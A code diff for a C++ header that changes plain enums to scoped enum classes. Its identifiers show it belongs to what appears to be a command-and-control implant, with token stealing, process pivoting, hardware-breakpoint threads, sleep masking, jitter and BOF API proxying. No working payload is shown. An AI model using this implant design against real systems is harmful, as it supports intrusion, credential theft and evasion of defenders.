@@ -120,15 +120,15 @@ namespace Str {
     auto GenRnd( ULONG StringSize ) -> PCHAR;
 }
 
-#define TSK_LENGTH ( Action::Task::TaskLast - 10 ) 
+#define TSK_LENGTH ( (ULONG)(Action::Task::TaskLast) - 10 ) 
 
 namespace Action {
-    enum Job {
+    enum class Job {
         List,
         Remove
     };
 
-    enum Task {
+    enum class Task {
         GetTask,
         PostTask,
         
@@ -170,29 +170,29 @@ namespace Action {
         GetResponse
     };
 
-    enum Inline {
+    enum class Inline {
         Init,
         GetResponse
     };
 
-    enum Thread {
+    enum class Thread {
         Random,
         Target,
         Hwbp
     };
 
-    enum Pivot {
+    enum class Pivot {
         Link = 10,
         Unlink,
         List
     };
 
-    enum Up {
+    enum class Up {
         Init,
         Chunk
     };
 
-    enum Config {
+    enum class Config {
         Jitter = 14,
         Sleep,
         Mask,
@@ -212,7 +212,7 @@ namespace Action {
         BofApiProxy
     };
 
-    enum Token {
+    enum class Token {
         GetUUID = 10,
         Steal,
         Make,
@@ -224,7 +224,7 @@ namespace Action {
         List
     };
 
-    enum Exit {
+    enum class Exit {
         Thread = 20,
         Proc
     };
